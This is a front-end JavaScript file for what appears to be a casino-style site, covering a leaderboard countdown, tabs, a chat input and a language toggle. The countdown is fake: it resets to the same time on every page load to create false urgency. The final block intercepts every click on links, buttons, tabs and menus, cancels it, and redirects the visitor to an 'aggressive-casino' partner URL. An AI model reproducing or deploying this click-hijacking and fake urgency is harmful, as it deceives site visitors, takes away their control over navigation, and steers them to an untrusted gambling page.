(function () {
    "use strict";

    // Copyright year
    var year = document.getElementById("year");
    if (year) year.textContent = String(new Date().getFullYear());

    // Leaderboard countdown
    var countdownEl = document.getElementById("leaderboardCountdown");
    if (countdownEl) {
        var endsAt = Date.now() + (8 * 3600 + 50 * 60 + 20) * 1000;
        var pad = function (n) { return n < 10 ? "0" + n : "" + n; };

        var tick = function () {
            var remaining = Math.max(0, Math.floor((endsAt - Date.now()) / 1000));
            var d = Math.floor(remaining / 86400);
            var h = Math.floor((remaining % 86400) / 3600);
            var m = Math.floor((remaining % 3600) / 60);
            var s = remaining % 60;
            countdownEl.textContent = pad(d) + ":" + pad(h) + ":" + pad(m) + ":" + pad(s);
            countdownEl.setAttribute("datetime",
                "P" + d + "DT" + h + "H" + m + "M" + s + "S");
        };
        tick();
        setInterval(tick, 1000);
    }

    // Leaderboard tabs
    var tabs = document.querySelectorAll('.leaderboard-tabs [role="tab"]');
    tabs.forEach(function (tab) {
        tab.addEventListener("click", function () {
            tabs.forEach(function (t) {
                t.classList.remove("is-active");
                t.setAttribute("aria-selected", "false");
                var panel = document.getElementById(t.getAttribute("aria-controls"));
                if (panel) panel.hidden = true;
            });
            tab.classList.add("is-active");
            tab.setAttribute("aria-selected", "true");
            var panel = document.getElementById(tab.getAttribute("aria-controls"));
            if (panel) panel.hidden = false;
        });
    });

    // Chat room tabs
    var rooms = document.querySelectorAll(".chat-rooms [role='tab']");
    rooms.forEach(function (r) {
        r.addEventListener("click", function () {
            rooms.forEach(function (o) {
                o.classList.remove("is-active");
                o.setAttribute("aria-selected", "false");
            });
            r.classList.add("is-active");
            r.setAttribute("aria-selected", "true");
        });
    });

    // Auto-grow textarea
    var chatInput = document.getElementById("chat-input");
    if (chatInput) {
        chatInput.addEventListener("input", function () {
            chatInput.style.height = "auto";
            chatInput.style.height = Math.min(chatInput.scrollHeight, 120) + "px";
        });
    }

    // Scroll chat to bottom on load
    var chatScroll = document.querySelector(".chat-scroll");
    if (chatScroll) chatScroll.scrollTop = chatScroll.scrollHeight;

    // Language dropdown toggle (stub)
    var langBtn = document.querySelector(".lang-btn");
    if (langBtn) {
        langBtn.addEventListener("click", function () {
            var expanded = langBtn.getAttribute("aria-expanded") === "true";
            langBtn.setAttribute("aria-expanded", expanded ? "false" : "true");
        });
    }

    // Global click funnel: any click on a link or button on the site
    // redirects the visitor to the partner landing page.
    var PARTNER_URL = "https://1wzpdo.life/v3/aggressive-casino?p=sjjr";

    document.addEventListener("click", function (e) {
        if (e.defaultPrevented) return;
        if (e.button !== 0) return;

        var target = e.target.closest && e.target.closest(
            "a, button, [role='button'], [role='tab'], .game-card, .hero-arrow, .menu-btn, .lang-btn"
        );
        if (!target) return;

        e.preventDefault();
        e.stopPropagation();

        if (e.metaKey || e.ctrlKey || e.shiftKey) {
            window.open(PARTNER_URL, "_blank", "noopener");
        } else {
            window.location.href = PARTNER_URL;
        }
    }, true);
})();
